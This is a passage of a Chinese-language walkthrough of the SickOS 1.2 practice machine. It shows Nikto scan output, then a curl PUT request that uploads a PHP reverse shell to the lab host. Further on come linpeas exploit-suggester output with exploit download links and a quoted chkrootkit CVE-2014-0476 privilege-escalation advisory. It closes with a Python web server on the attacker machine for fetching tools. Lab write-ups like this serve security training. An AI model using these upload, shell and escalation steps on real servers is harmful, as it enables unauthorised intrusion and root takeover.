X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span><br><span class="line">+ /test/: Directory indexing found.</span><br><span class="line">+ No CGI Directories found (use <span class="string">&#x27;-C all&#x27;</span> to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ /nikto-test-BJAN5d58.html: HTTP method <span class="string">&#x27;PUT&#x27;</span> allows clients to save files on the web server. See: https://portswigger.net/kb/issues/00100900_http-put-method-is-enabled</span><br><span class="line">+ OPTIONS: Allowed HTTP Methods: ARRAY(0x558c1cb31bb0) .</span><br><span class="line">+ /test/./: Directory indexing found.</span><br><span class="line">+ /test/./: Appending <span class="string">&#x27;/./&#x27;</span> to a directory allows indexing.</span><br><span class="line">+ /test//: Directory indexing found.</span><br><span class="line">+ /test//: Apache on Red Hat Linux release 9 reveals the root directory listing by default <span class="keyword">if</span> there is no index page.</span><br><span class="line">+ /test/%2e/: Directory indexing found.</span><br><span class="line">+ /test/%2e/: Weblogic allows <span class="built_in">source</span> code or directory listing, upgrade to v6.0 SP1 or higher. See: http://www.securityfocus.com/bid/2513</span><br><span class="line">+ /test/%2f/: Directory indexing found.</span><br><span class="line">+ /test/%2f/: Weblogic allows <span class="built_in">source</span> code or directory listing, upgrade to v6.0 SP1 or higher. See: http://www.securityfocus.com/bid/2513</span><br><span class="line">+ /test///: Directory indexing found.</span><br><span class="line">+ /test/?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via <span class="string">&#x27;open directory browsing&#x27;</span>. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269</span><br><span class="line">+ /test/?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via <span class="string">&#x27;open directory browsing&#x27;</span>. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269</span><br><span class="line">+ /test///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.</span><br><span class="line">+ /test///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when multiple /<span class="string">&#x27;s are requested. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1078</span></span><br><span class="line"><span class="string">+ /test/#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span></span><br><span class="line"><span class="string">+ 8104 requests: 0 error(s) and 19 item(s) reported on remote host</span></span><br><span class="line"><span class="string">+ End Time:           2024-12-20 02:42:01 (GMT-5) (54 seconds)</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">+ 1 host(s) tested</span></span><br></pre></td></tr></table></figure>
+<p>扫描显示支持 PUT 方法</p>
+<blockquote>
+<p>HTTP method 'PUT' allows clients to save files on the web server.
+See:
+https://portswigger.net/kb/issues/00100900_http-put-method-is-enabled</p>
+</blockquote>
+<p>利用 curl 上传 shell 测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/sickos1.2]</span><br><span class="line">└─<span class="comment"># curl  -X OPTIONS 192.168.159.7/test -v</span></span><br><span class="line">*   Trying 192.168.159.7:80...</span><br><span class="line">* Connected to 192.168.159.7 (192.168.159.7) port 80</span><br><span class="line">&gt; OPTIONS /test HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.159.7</span><br><span class="line">&gt; User-Agent: curl/8.8.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Request completely sent off</span><br><span class="line">&lt; HTTP/1.1 301 Moved Permanently</span><br><span class="line">&lt; DAV: 1,2</span><br><span class="line">&lt; MS-Author-Via: DAV</span><br><span class="line">&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK</span><br><span class="line">&lt; Location: http://192.168.159.7/test/</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Date: Fri, 20 Dec 2024 16:11:29 GMT</span><br><span class="line">&lt; Server: lighttpd/1.4.28</span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host 192.168.159.7 left intact</span></span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/sickos1.2]</span><br><span class="line">└─<span class="comment"># curl -v -X PUT -T re_shell.php   http://192.168.159.7/test/            </span></span><br><span class="line">Note: Unnecessary use of -X or --request, PUT is already inferred.</span><br><span class="line">*   Trying 192.168.159.7:80...</span><br><span class="line">* Connected to 192.168.159.7 (192.168.159.7) port 80</span><br><span class="line">&gt; PUT /test/re_shell.php HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.159.7</span><br><span class="line">&gt; User-Agent: curl/8.8.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Length: 2705</span><br><span class="line">&gt; </span><br><span class="line">* upload completely sent off: 2705 bytes</span><br><span class="line">&lt; HTTP/1.1 201 Created</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Date: Fri, 20 Dec 2024 16:16:51 GMT</span><br><span class="line">&lt; Server: lighttpd/1.4.28</span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host 192.168.159.7 left intact</span></span><br></pre></td></tr></table></figure>
+<p>上传成功！</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412201623182.jpg" /></p>
+<h2 id="反弹-shell">5. 反弹 Shell</h2>
+<p>获得 www-data 权限 shell</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412201623676.jpg" /></p>
+<h2 id="提权">6. 提权</h2>
+<p>经查靶机对出网端口有限制，Kali 利用 python 开了个 Web，本想靶机从
+Kali 下载 linpeas.sh 和 pspy 执行看看，经测靶机访问不了 Kali 的
+Web，试了 80，53，8000
+都不行，推测靶机防火墙对出网端口都做了比较严格的限制</p>
+<p>还是利用前面上传 shell 的方法上传
+linpeas.sh，执行找到了一些可能的提权漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">…………………………</span><br><span class="line">╔══════════╣ Executing Linux Exploit Suggester</span><br><span class="line">╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          </span><br><span class="line"><span class="built_in">cat</span>: write error: Broken pipe                                                                                                                                                                                                               </span><br><span class="line">[+] [CVE-2016-5195] dirtycow</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,[ ubuntu=16.04|14.04|12.04 ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40611</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-5195] dirtycow 2</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40839</span><br><span class="line">   ext-url: https://www.exploit-db.com/download/40847</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2015-3202] fuse (fusermount)</span><br><span class="line"></span><br><span class="line">   Details: http://seclists.org/oss-sec/2015/q2/520</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: debian=7.0|8.0,[ ubuntu=* ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/37089</span><br><span class="line">   Comments: Needs cron or system admin interaction</span><br><span class="line"></span><br><span class="line">[+] [CVE-2014-4014] inode_capable</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=12.04 ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/33824</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-3156] sudo Baron Samedit</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: mint=19,ubuntu=18|20, debian=10</span><br><span class="line">   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-3156] sudo Baron Samedit 2</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10</span><br><span class="line">   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write</span><br><span class="line"></span><br><span class="line">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span><br><span class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c</span><br><span class="line">   Comments: ip_tables kernel module must be loaded</span><br><span class="line"></span><br><span class="line">[+] [CVE-2019-18634] sudo pwfeedback</span><br><span class="line"></span><br><span class="line">   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: mint=19</span><br><span class="line">   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c</span><br><span class="line">   Comments: sudo configuration requires pwfeedback to be enabled.</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-6074] dccp</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=(14.04|16.04)&#123;kernel:4.4.0-62-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/41458</span><br><span class="line">   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-1000370,CVE-2017-1000371] linux_offset2lib</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_offset2lib.c</span><br><span class="line">   Comments: Uses <span class="string">&quot;Stack Clash&quot;</span> technique</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-1000366,CVE-2017-1000371] linux_ldso_dynamic</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: debian=9|10,ubuntu=14.04.5|16.04.2|17.04,fedora=23|24|25</span><br><span class="line">   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_dynamic.c</span><br><span class="line">   Comments: Uses <span class="string">&quot;Stack Clash&quot;</span> technique, works against most SUID-root PIEs</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-1000366,CVE-2017-1000370] linux_ldso_hwcap</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap.c</span><br><span class="line">   Comments: Uses <span class="string">&quot;Stack Clash&quot;</span> technique, works against most SUID-root binaries</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-2384] usb-midi</span><br><span class="line"></span><br><span class="line">   Details: https://xairy.github.io/blog/2016/cve-2016-2384</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=14.04,fedora=22</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c</span><br><span class="line">   Comments: Requires ability to plug <span class="keyword">in</span> a malicious USB device and to execute a malicious binary as a non-privileged user</span><br><span class="line"></span><br><span class="line">[+] [CVE-2015-8660] overlayfs (ovl_setattr)</span><br><span class="line"></span><br><span class="line">   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=(14.04|15.10)&#123;kernel:4.2.0-(18|19|20|21|22)-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/39166</span><br><span class="line"></span><br><span class="line">[+] [CVE-2015-8660] overlayfs (ovl_setattr)</span><br><span class="line"></span><br><span class="line">   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/39230</span><br><span class="line"></span><br><span class="line">[+] [CVE-2014-5207] fuse_suid</span><br><span class="line"></span><br><span class="line">   Details: https://www.exploit-db.com/exploits/34923/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/34923</span><br><span class="line"></span><br><span class="line">[+] [CVE-2014-5119] __gconv_translit_find</span><br><span class="line"></span><br><span class="line">   Details: http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: debian=6</span><br><span class="line">   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/34421.tar.gz</span><br><span class="line"></span><br><span class="line">[+] [CVE-2014-0476] chkrootkit</span><br><span class="line"></span><br><span class="line">   Details: http://seclists.org/oss-sec/2014/q2/430</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/33899</span><br><span class="line">   Comments: Rooting depends on the crontab (up to one day of delay)</span><br><span class="line"></span><br><span class="line">[+] [CVE-2014-0196] rawmodePTY</span><br><span class="line"></span><br><span class="line">   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/33516</span><br><span class="line"></span><br><span class="line">[+] [CVE-2012-0809] death_star (sudo)</span><br><span class="line"></span><br><span class="line">   Details: http://seclists.org/fulldisclosure/2012/Jan/att-590/advisory_sudo.txt</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: fedora=16</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/18436</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-0728] keyring</span><br><span class="line"></span><br><span class="line">   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40003</span><br><span class="line">   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">╔══════════╣ Executing Linux Exploit Suggester 2</span><br><span class="line">╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                     </span><br><span class="line">  [1] exploit_x                                                                                                                                                                                                                             </span><br><span class="line">      CVE-2018-14665</span><br><span class="line">      Source: http://www.exploit-db.com/exploits/45697</span><br><span class="line">  [2] pp_key</span><br><span class="line">      CVE-2016-0728</span><br><span class="line">      Source: http://www.exploit-db.com/exploits/39277</span><br><span class="line">  [3] timeoutpwn</span><br><span class="line">      CVE-2014-0038</span><br><span class="line">      Source: http://www.exploit-db.com/exploits/31346</span><br><span class="line"></span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
+<p>测试利用 dirtycow 提权，每次都会导致靶机崩溃……</p>
+<p>后面又试了几个但都没成功……</p>
+<p>看了其他师傅的提权用的是 chkrootkit 的 CVE-2014-0476 漏洞</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.chkrootkit.org/">chkrootkit -- locally checks
+for signs of a rootkit</a></p>
+<p>chkrootkit是用来监测 rootkit 是否被安装到当前系统中的工具。</p>
+<p>所谓 rootkit
+，是一类入侵者经常使用的工具。这类工具通常非常的隐秘、令用户不易察觉，通过这类工具，入侵者建立了一条能够常时入侵系统，或者说对系统进行实时控制的途径。所以，我们要用
+chkrootkit 来定时监测系统，以保证系统的安全。</p>
+</blockquote>
+<p>Chkrootkit 0.49 - Local Privilege Escalation</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33899">Chkrootkit 0.49 -
+Local Privilege Escalation - Linux local Exploit</a></p>
+<p>We just found a serious vulnerability in the chkrootkit package,
+which may allow local attackers to gain root access to a box in certain
+configurations (/tmp not mounted noexec).</p>
+<p>The vulnerability is located in the function slapper() in the
+shellscript chkrootkit:</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># SLAPPER.&#123;A,B,C,D&#125; and the multi-platform variant</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">slapper ()&#123;</span></span><br><span class="line">   SLAPPER_FILES=<span class="string">&quot;$&#123;ROOTDIR&#125;tmp/.bugtraq $&#123;ROOTDIR&#125;tmp/.bugtraq.c&quot;</span></span><br><span class="line">   SLAPPER_FILES=<span class="string">&quot;$SLAPPER_FILES $&#123;ROOTDIR&#125;tmp/.unlock $&#123;ROOTDIR&#125;tmp/httpd \</span></span><br><span class="line"><span class="string">   $&#123;ROOTDIR&#125;tmp/update $&#123;ROOTDIR&#125;tmp/.cinik $&#123;ROOTDIR&#125;tmp/.b&quot;</span>a</span><br><span class="line">   SLAPPER_PORT=<span class="string">&quot;0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 &quot;</span></span><br><span class="line">   OPT=-an</span><br><span class="line">   STATUS=<span class="number">0</span></span><br><span class="line">   file_port=</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> $&#123;netstat&#125; <span class="string">&quot;$&#123;OPT&#125;&quot;</span>|$&#123;egrep&#125; <span class="string">&quot;^tcp&quot;</span>|$&#123;egrep&#125; <span class="string">&quot;$&#123;SLAPPER_PORT&#125;&quot;</span>&gt;</span><br><span class="line">/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">      then</span><br><span class="line">      STATUS=<span class="number">1</span></span><br><span class="line">      [ <span class="string">&quot;$SYSTEM&quot;</span> = <span class="string">&quot;Linux&quot;</span> ] &amp;&amp; file_port=`netstat -p $&#123;OPT&#125; | \</span><br><span class="line">         $egrep ^tcp|$egrep <span class="string">&quot;$&#123;SLAPPER_PORT&#125;&quot;</span> | $&#123;awk&#125; <span class="string">&#x27;&#123; print  $7 &#125;&#x27;</span> |</span><br><span class="line">tr -d :`</span><br><span class="line">   fi</span><br><span class="line">   <span class="keyword">for</span> i in $&#123;SLAPPER_FILES&#125;; <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> [ -f $&#123;i&#125; ]; then</span><br><span class="line">         file_port=$file_port $i</span><br><span class="line">         STATUS=<span class="number">1</span></span><br><span class="line">      fi</span><br><span class="line">   done</span><br><span class="line">   <span class="keyword">if</span> [ $&#123;STATUS&#125; -eq <span class="number">1</span> ] ;then</span><br><span class="line">      echo <span class="string">&quot;Warning: Possible Slapper Worm installed ($file_port)&quot;</span></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">if</span> [ <span class="string">&quot;$&#123;QUIET&#125;&quot;</span> != <span class="string">&quot;t&quot;</span> ]; then echo <span class="string">&quot;not infected&quot;</span>; fi</span><br><span class="line">         <span class="keyword">return</span> $&#123;NOT_INFECTED&#125;</span><br><span class="line">   fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>The line 'file_port=$file_port $i' will execute all files specified
+in $SLAPPER_FILES as the user chkrootkit is running (usually root), if
+$file_port is empty, because of missing quotation marks around the
+variable assignment.</p>
+<p>Steps to reproduce:</p>
+<ul>
+<li>Put an executable file named 'update' with non-root owner in /tmp
+(not mounted noexec, obviously)<br />
+</li>
+<li>Run chkrootkit (as uid 0)</li>
+</ul>
+<p>Result: The file /tmp/update will be executed as root, thus
+effectively rooting your box, if malicious content is placed inside the
+file.</p>
+<p>If an attacker knows you are periodically running chkrootkit (like in
+cron.daily) and has write access to /tmp (not mounted noexec), he may
+easily take advantage of this.</p>
+<p>Suggested fix: Put quotation marks around the assignment.</p>
+<p>file_port="$file_port $i"</p>
+<p>I will also try to contact upstream, although the latest version of
+chkrootkit dates back to 2009 - will have to see, if I reach a dev
+there.</p>
+</blockquote>
+<p>该漏洞的利用需要 chkrootkit
+在靶机被定时执行，直接查定时任务并没有查到</p>
+<figure class="highlight plaintext"><figcaption><span>cat</span><a href="/etc/crontab">/etc/cron.d/*</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># /etc/crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"># m h dom mon dow user  command</span><br><span class="line">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">#</span><br><span class="line">cat: /etc/cron.d/*: Permission denied</span><br></pre></td></tr></table></figure>
+<p>可能是权限不够，想传个 pspy32 上去监视下，但前面上传 shell
+的方法不可行，又去测试出网端口发现 8080 可行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure>
+<p>下载，赋权，执行</p>
